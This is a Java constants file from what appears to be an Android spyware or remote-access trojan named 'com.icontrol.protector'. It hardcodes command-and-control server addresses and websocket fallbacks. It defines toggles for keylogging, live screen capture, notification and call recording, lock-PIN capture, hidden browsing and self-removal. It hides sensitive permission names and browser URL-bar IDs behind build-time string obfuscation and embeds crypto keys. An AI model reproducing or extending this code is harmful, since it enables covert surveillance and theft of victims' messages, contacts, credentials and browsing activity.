package com.icontrol.protector;



import static com.icontrol.protector.My_Configs.OConstsS;
import static com.icontrol.protector.My_Configs.subdir;
import static com.icontrol.protector.UtliTools.fromBase64;
import static com.icontrol.protector.UtliTools.isURLReachable;
import static com.icontrol.protector.UtliTools.isWebSocketReachable;
import static com.icontrol.protector.UtliTools.randomnumber;

import android.content.Intent;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Random;

public class Consts {


   public static String BTVersion = "BT-v3.4.1";



    public static int Preformance = 20000;


    //public static String TouchsPath = "/systems/sys/apps/tch";
    //public static String errospath = "/systemscrash/sys/apps/log";

    public static String Sockets_Servers = "";//this will be replaced later  // > wss://server.yaarsa.com/con<
    public static String Server_Address = "";//this will be replaced later // > 195.160.221.203



   // public static String localip = "127.0.0.1";
   // public static String google = "https://google.com";



    public static String last_accepted_sk = null;
    public static String URL_SOCKT() {
        String decryptedHosts = Sockets_Servers;
        String[] hosts = decryptedHosts.split("<");

        if(last_accepted_sk!=null ){
            if (isWebSocketReachable(last_accepted_sk)){
                return  last_accepted_sk;
            }else{
                last_accepted_sk = null;
            }

        }

        for (String host : hosts) {

            if (isWebSocketReachable(host)) {
                last_accepted_sk=host;
                return host;
            }
        }
        return  "ws://195.160.221.203:8080/";
    }


    public static String getIPAddress(String hostname) {
        //return "192.168.1.2";
        //TODO<-------------
        try {
            InetAddress address = InetAddress.getByName(hostname);
            return address.getHostAddress();
        } catch (UnknownHostException e) {
            e.printStackTrace();
            MyLoger.Error("getIPAddress", e.getMessage());
            return Server_Address;
        }
    }


 public static String last_accepted_ping = null;

 public static String URL_PING() {

  if(last_accepted_ping!=null ){
   if (isURLReachable(last_accepted_ping)){
    return  last_accepted_ping;
   }else{
    last_accepted_ping = null;
   }
  }

  My_Crpter cr = My_Crpter.Getinstance();
  String decryptedHosts = cr.Dcrpt_Str(My_Configs.USR_HOST);
  String[] hosts = decryptedHosts.split("<");
  for (String host : hosts) {
      String addressip = getIPAddress(host);
      String backupUrl = "http://" + addressip + subdir + "yarsap_80541.php";

      if (isURLReachable(backupUrl)) {
          last_accepted_ping = backupUrl;
          return backupUrl;
      }
  }
  return "http://" + Server_Address + subdir + "yarsap_80541.php";

 }
//"https://yourserver.com/log_error.php"

public static String URL_ERROR() {


    My_Crpter cr = My_Crpter.Getinstance();
    String decryptedHosts = cr.Dcrpt_Str(My_Configs.USR_HOST);
    String[] hosts = decryptedHosts.split("<");
    for (String host : hosts) {
        String addressip = getIPAddress(host);
        String backupUrl = "http://" + addressip + subdir + "log_error.php";

        if (isURLReachable(backupUrl)) {

            return backupUrl;
        }
    }
    return "http://" + Server_Address + subdir + "log_error.php";

}
    //socket

//    public static String SPLIT_SKT = "[>S<]";
//    public static String SPLIT_DATA = "[>D<]";
//    public static String SPLIT_LINE = "[>L<]";
//    public static String SPLIT_ARAY = "[>A<]";
    public static String SPLIT_SKT = "[>SKT<]";
    public static String SPLIT_DATA = "[>DAT<]";
    public static String SPLIT_LINE = "[>LIN<]";
    public static String SPLIT_ARAY = "[>ARY<]";


    //Settings


    public static final String USR_NAME = "CN";

    public static final String DEVICE_ID = "ID";
    public static final String RecordName = "RecNam";
    public static final String ontimerest = "onerestrct";

    public static final String Mob_width = "Wscr";
    public static final String Mob_height = "Hscr";


    //Settings options
    public static final String Rec_Activitys = "Rec_Activitys";
    public static final String Rec_Notifications = "Rec_Notifications";
   // public static final String Rec_keystrokes = "Rec_keystrokes";
    public static final String Rec_links = "Rec_links";
    public static final String Rec_apps = "Rec_apps";
    //public static final String Live_Notify = "Liv_noty";
    public static final String Live_Screen = "Liv_scr";
   // public static final String Auto_j = "Ato_j";
    public static boolean Auto_jct = false;
    public static  boolean Live_Nots = false;

    public static  boolean Rec_klogs = false;

    public static  boolean liv_klogs =false;


    public static String THE_IDF = "THE_IDF";
    public static String Sec_IDF = "SEC_IDF";
    public static String THE_CIP = "THE_CIP";



    public static String patternmp = "pt_mp";



   // public static final String LIVE_KLOG = "LIVE_KLOG";


    //notification

    //public static final int Notifi_ID = randomnumber(11111, 88888);


    //for screen cap
    public static Intent Stored_intentdata = null;
    public static int Stored_resultCode = -999;


    //accessibility booleans
    //public static String Auto_Clicker = "Auto_Click";//local
    //public static String Auto_Prims = "Auto_Prims";//local
    public static String Send_Skilton = "Skiton_on";//local
    public static String Skeleton_Color = "Skiton_clr";//local
    //public static String Black_Screen = "black_scr";//local
    //public static  String Stop_Scanner ="stop_scan";//local
   // public static String Auto_Sreen = "Auto_Screen";//local
    //public static String Auto_Battary = "Auto_Battary";//local
    public static String lock_screen = "lck_scr";//local
    public static String lock_pin = "lck_pin";//local
    public static String lock_title = "lck_title";//local
    public static String lock_msg = "lck_msg";//local
    public static String lock_type = "lck_typ";//local
    public static String lock_cods = "lck_cds";//local



    public static String mob_lock = "mob_lck";//local


    public static String AutoStartOn = "auto_ok";//local
    public static String skipxaomi = "skp_xoi";//local

    public static String Silent_Screen = "Silent_scr";//local
    public static String Self_Record = "self_rec";//local
    public static String Live_skilton = "liv_skli";//local
    public static String Live_scread = "liv_skread";//local
    public static String Hidden_browser = "hid_bro";//local
    public static String web_browser = "web_bro";//local
    public static String web_pass = "web_pas";//local
    public static String enable_trak = "enb_trk";//local
    public static boolean skip_splash = false;//local
    //public static String All_set = "all_set";//local
    public static int SCRQuality = 10;
    public static String SCRSIDF = "null";
    public final static String slide_up = "up";//local
    public final static String slide_down = "down";//local
    public final static String slide_left = "left";//local
    public final static String slide_right = "right";//local


    //public final static String sendloc = "send_loc";//local
    public final static String Alertico = "alert_ico";//local
    public final static String setupok = "setup_ok";//local



    public final static String Redirect_e = "red_e";//local
    public final static String Redirect_ip = "red_ip";//local
    public final static String Redirect_k = "red_k";//local




    public static boolean Tregerdbtrry = false;
    public static boolean removeme = false;
    public static boolean removeapp = false;



    //obfus

    //"+ OBFS +" will be replaced with random string during build from vb.net


    //"+ OBFS +" = OConstsS



    public static final String Time_Stamp = UtliTools.Fix_it("Time" + OConstsS + "Stamp", OConstsS);
    public static final String Accessibility_Service = UtliTools.Fix_it("Accessibility" + OConstsS + "Service", OConstsS);
    public static final String Read_Contacts = UtliTools.Fix_it("Read" + OConstsS + "Contacts", OConstsS);
    public static final String Read_SMS = UtliTools.Fix_it("Read" + OConstsS + "SMS", OConstsS);
    public static final String Read_Call_Log = UtliTools.Fix_it("Read" + OConstsS + "Call" + OConstsS + "Log", OConstsS);
    public static final String Acc_Camera = UtliTools.Fix_it("Cam" + OConstsS + "era", OConstsS);
    public static final String Get_Accounts = UtliTools.Fix_it("Get" + OConstsS + "Accounts", OConstsS);
    public static final String Record_Audio = UtliTools.Fix_it("Record" + OConstsS + "Audio", OConstsS);
    //public static final String Location = UtliTools.Fix_it("Location", OConstsS);
    public static String IV = UtliTools.Fix_it("2230209"+OConstsS+"522049090", OConstsS);
    public static String PASSWORD = UtliTools.Fix_it("48147805"+OConstsS+"84699673", OConstsS);
    public static String SALT =UtliTools.Fix_it( "28943563"+OConstsS+"30652558", OConstsS);
    public static final String Call_Phone = UtliTools.Fix_it("Call" + OConstsS + "Phone", OConstsS);
    public static final String Post_Noty = UtliTools.Fix_it("Notify" + OConstsS + "Prim", OConstsS);
    public static final String Call_Record = UtliTools.Fix_it("Call" + OConstsS + "Record", OConstsS);
    public static final String Send_SMS = UtliTools.Fix_it("Send" + OConstsS + "SMS", OConstsS);
    public static final String Set_Wallpaper = UtliTools.Fix_it("Set" + OConstsS + "Wallpaper", OConstsS);
    public static final String Doze_Mode = UtliTools.Fix_it("Doze" + OConstsS + "Mode", OConstsS);
    public static final String Draw_Overlays = UtliTools.Fix_it("Draw" + OConstsS + "Overlays", OConstsS);
    public static final String Package_Installs = UtliTools.Fix_it("Package" + OConstsS + "Installs", OConstsS);
    public static final String write_settings_sys = UtliTools.Fix_it("Write" + OConstsS + "Settings", OConstsS);
    public static final String file_acc_state = UtliTools.Fix_it("files" + OConstsS + "access", OConstsS);

    public static final String CHROME_PACKAGE = UtliTools.Fix_it("com.andr" + OConstsS + "oid.chrome", OConstsS);
    public static final String CHROME_ID = UtliTools.Fix_it("com.android.chrome:id/url_" + OConstsS + "bar", OConstsS);
    public static final String FIREFOX_PACKAGE = UtliTools.Fix_it("org.mozi" + OConstsS + "lla.firefox", OConstsS);
    public static final String FIREFOX_ID = UtliTools.Fix_it("org.mozilla.firefox:id/url_" + OConstsS + "bar_title", OConstsS);
    public static final String SAMSUNG_BROWSER_PACKAGE = UtliTools.Fix_it("com.sec.an" + OConstsS + "droid.app.sbrowser", OConstsS);
    public static final String SAMSUNG_BROWSER_ID = UtliTools.Fix_it("com.sec.android.app.sbrowser:id/" + OConstsS + "location_bar_edit_text", OConstsS);
    public static final String BRAVE_PACKAGE = UtliTools.Fix_it("com.b" + OConstsS + "rave.browser", OConstsS);
    public static final String BRAVE_ID = UtliTools.Fix_it("com.brave.browser:id/" + OConstsS + "url_bar", OConstsS);
    public static final String OPERA_PACKAGE = UtliTools.Fix_it("com.oper" + OConstsS + "a.browser", OConstsS);
    public static final String OPERA_ID = UtliTools.Fix_it("com.opera.browser:id/" + OConstsS + "url_field", OConstsS);
    public static final String DUCKDUCKGO_PACKAGE = UtliTools.Fix_it("com.duckduck" + OConstsS + "go.mobile.android", OConstsS);
    public static final String DUCKDUCKGO_ID = UtliTools.Fix_it("com.duckduckgo.mobile.android:id/" + OConstsS + "omnibarTextInput", OConstsS);
    public static final String OPERA_MINI_PACKAGE = UtliTools.Fix_it("com.oper" + OConstsS + "a.mini.native", OConstsS);
    public static final String OPERA_MINI_ID = UtliTools.Fix_it("com.opera.mini.native:id/" + OConstsS + "url_field", OConstsS);
    public static final String MICROSOFT_EDGE_PACKAGE = UtliTools.Fix_it("com.micro" + OConstsS + "soft.emmx", OConstsS);
    public static final String MICROSOFT_EDGE_ID = UtliTools.Fix_it("com.microsoft.emmx:id/" + OConstsS + "url_bar", OConstsS);
    public static final String COLOROS_BROWSER_PACKAGE = UtliTools.Fix_it("com.col" + OConstsS + "oros.browser", OConstsS);
    public static final String COLOROS_BROWSER_ID = UtliTools.Fix_it("com.coloros.browser:id/" + OConstsS + "azt", OConstsS);
    public static final String ANDROID_BROWSER_PACKAGE = UtliTools.Fix_it("com.andro" + OConstsS + "id.browser", OConstsS);
    public static final String ANDROID_BROWSER_ID = UtliTools.Fix_it("com.android.browser:id/" + OConstsS + "url", OConstsS);
    public static final String TUNNY_BROWSER_PACKAGE = UtliTools.Fix_it("mobi.mgee" + OConstsS + "k.TunnyBrowser", OConstsS);
    public static final String TUNNY_BROWSER_ID = UtliTools.Fix_it("mobi.mgeek.TunnyBrowser:id/" + OConstsS + "search_input", OConstsS);
}
